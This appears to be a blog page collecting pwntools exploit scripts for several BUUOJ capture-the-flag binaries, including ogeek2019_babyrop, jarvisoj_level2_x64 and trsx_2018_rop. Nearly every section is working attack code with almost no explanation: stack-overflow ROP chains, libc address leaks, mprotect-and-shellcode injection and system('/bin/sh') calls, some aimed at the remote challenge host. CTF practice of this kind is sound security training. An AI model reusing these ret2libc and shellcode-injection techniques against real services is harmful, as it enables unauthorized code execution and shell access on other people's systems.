<h3 id="ogeek2019-babyrop"><a href="#ogeek2019-babyrop" class="headerlink" title="ogeek2019_babyrop"></a>ogeek2019_babyrop</h3><p><a href="stack/ogeek2019_babyrop/ogeek2019_babyrop" title="ogeek2019_babyrop">attachment</a><br><a href="stack/ogeek2019_babyrop/libc-2.23.so" title="libc-2.23.so">libc-2.23.so</a><br>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">sh=process(<span class="string">&quot;./ogeek2019-babyrop&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,29154)</span></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x080487E9&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./ogeek2019-babyrop&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_write=libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_bin_sh=libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">start_vul=<span class="number">0x080487D0</span></span><br><span class="line"></span><br><span class="line">poc1=<span class="string">b&#x27;\x00&#x27;</span>+<span class="number">7</span>*<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">sh.sendline(poc1)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_plt))</span><br><span class="line">get_write_got_payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_plt)+p32(start_vul)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">sh.sendline(get_write_got_payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">base_addr=write_addr-libc_write</span><br><span class="line">system_addr=base_addr+libc_system</span><br><span class="line">libc_bin_sh=base_addr+libc_bin_sh</span><br><span class="line"></span><br><span class="line">getshell_payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(start_vul)+p32(libc_bin_sh)</span><br><span class="line">sh.sendline(getshell_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p><a href="stack/get_started_3dsctf_2016/get_started_3dsctf_2016" title="get_started_3dsctf_2016">attachment</a><br>exp1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">getflag_addr=<span class="number">0x080489A0</span></span><br><span class="line">exit_addr=<span class="number">0x0804E6A0</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">sh=process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,29230)</span></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x08048A40&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(getflag_addr)+p32(exit_addr)+p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>exp2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(const void *start, size_t len, int prot);</span><br><span class="line">	param1: operate address </span><br><span class="line">	param2: operate leng。</span><br><span class="line">	param3: operate change to permission</span><br><span class="line"></span><br><span class="line">for example mprotect（0x600000，0x1000，7）</span><br></pre></td></tr></table></figure>
<p>because function read&amp;mprotect both need three params. so we search pop3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bkfish@ubuntu:~/Desktop/pwn/tmp$ ROPgadget --binary get_started_3dsctf_2016 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line"></span><br><span class="line">0x08063adb : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x080509a5 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e4c5 : pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">mprotect_addr=<span class="number">0x0806EC80</span></span><br><span class="line">sh=process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">read_addr=<span class="number">0x0806E140</span></span><br><span class="line">pop3_addr=<span class="number">0x08063adb</span></span><br><span class="line">bss_addr=<span class="number">0x080EB000</span></span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,29230)</span></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x08048A40&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#change bss permisson</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect_addr)+p32(pop3_addr)+p32(bss_addr)+p32(<span class="number">0x1000</span>)+p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">payload+=p32(read_addr)+p32(pop3_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">0x50</span>)+p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload2=asm(shellcraft.sh())</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><p><a href="stack/jarvisoj_level2_x64/jarvisoj_level2_x64" title="jarvisoj_level2_x64">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bkfish@ubuntu:~/Desktop/pwn/tmp$ ROPgadget --binary level2_x64 --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x00000000004006ac</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006ae</span> : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006b0</span> : pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006b2</span> : pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006ab</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006af</span> : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400560</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x00000000004006b3</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x00000000004006b1</span> : pop rsi ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006ad</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004004a1</span> : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">11</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#sh=process(&quot;./level2_x64&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29018</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x00000000004006b3</span></span><br><span class="line">bin_sh=<span class="number">0x0000000000600a90</span></span><br><span class="line">system_addr=<span class="number">0x00000000004004C0</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004004a1</span></span><br><span class="line">system_addr1=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr1))</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(bin_sh)+p64(ret_addr)+p64(system_addr1)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="HarekazeCTF2019-babyrop"><a href="#HarekazeCTF2019-babyrop" class="headerlink" title="HarekazeCTF2019_babyrop"></a>HarekazeCTF2019_babyrop</h3><p><a href="stack/HarekazeCTF2019_babyrop/HarekazeCTF2019_babyrop" title="HarekazeCTF2019_babyrop">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./HarekazeCTF2019_babyrop&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,27421)</span></span><br><span class="line">bin_sh=<span class="number">0x0000000000601048</span></span><br><span class="line">system_addr=<span class="number">0x0000000000400490</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400683</span></span><br><span class="line">ret=<span class="number">0x0000000000400479</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p><a href="stack/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016" title="not_the_same_3dsctf_2016">attachment</a><br>exp1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">getflag=<span class="number">0x080489A0</span></span><br><span class="line">flag_addr=<span class="number">0x080ECA2D</span></span><br><span class="line">write_addr=<span class="number">0x0806E270</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh=process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x080489DE&#x27;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2D</span>+p32(getflag)+p32(write_addr)+p32(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(flag_addr)+p32(<span class="number">50</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>exp2:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">pop3_addr=<span class="number">0x0806fcf0</span></span><br><span class="line">mprotect_addr=<span class="number">0x0806ED40</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">read_addr=<span class="number">0x0806E200</span></span><br><span class="line">start_bss=<span class="number">0x80eb000</span></span><br><span class="line">sh=process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x08048A00&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2D</span>+p32(mprotect_addr)+p32(pop3_addr)+p32(start_bss)+p32(<span class="number">0x1000</span>)+p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#read bss</span></span><br><span class="line">payload+=p32(read_addr)+p32(pop3_addr)+p32(<span class="number">0</span>)+p32(start_bss)+p32(<span class="built_in">len</span>(payload2))+p32(start_bss)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><p><a href="stack/ciscn_2019_n_5/ciscn_2019_n_5" title="ciscn_2019_n_5">attachment</a><br>exp1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_n_5&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os =  <span class="string">&quot;linux&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x0000000000601080</span></span><br><span class="line">sh=process(<span class="string">&quot;./ciscn_2019_n_5&quot;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,27285)</span></span><br><span class="line">pwnlib.gdb.attach(sh,<span class="string">&#x27;b *0x00000000004006AA&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x8</span>+p64(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>exp2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 26628)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000004004c9</span></span><br><span class="line">rdi = <span class="number">0x0000000000400713</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;tell me your name\n&#x27;</span>, <span class="string">&#x27;w1nd&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;tell me your name\n&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p><a href="stack/ciscn_2019_ne_5/ciscn_2019_ne_5" title="ciscn_2019_ne_5">attachment</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line"><span class="comment">#print(hex(elf.search(b&#x27;sh&#x27;).__next__()))</span></span><br><span class="line"></span><br><span class="line">sh_addr=<span class="number">0x80482ea</span></span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x080484D0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(<span class="number">0x080486C7</span>)+p32(<span class="number">0x80482ea</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&quot;./ciscn_2019_ne_5&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26512</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;administrator&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<h3 id="trsx-2018-rop"><a href="#trsx-2018-rop" class="headerlink" title="trsx_2018_rop"></a>trsx_2018_rop</h3><p><a href="stack/trsx_2018_rop/trsx_2018_rop" title="trsx_2018_rop">attachment</a><br>remote</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./trsx_2018_rop&quot;</span>)</span><br><span class="line">vul_start_addr=<span class="number">0x08048474</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment">#sh=process(&quot;./trsx_2018_rop&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27410</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0804849C&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop3_addr=<span class="number">0x0804855d</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_plt)+p32(pop3_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)+p32(vul_start_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">write_leak_addr=u32(sh.recv())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_leak_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;write&quot;</span>,write_leak_addr)</span><br><span class="line">libcbase=write_leak_addr-libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>local</p>
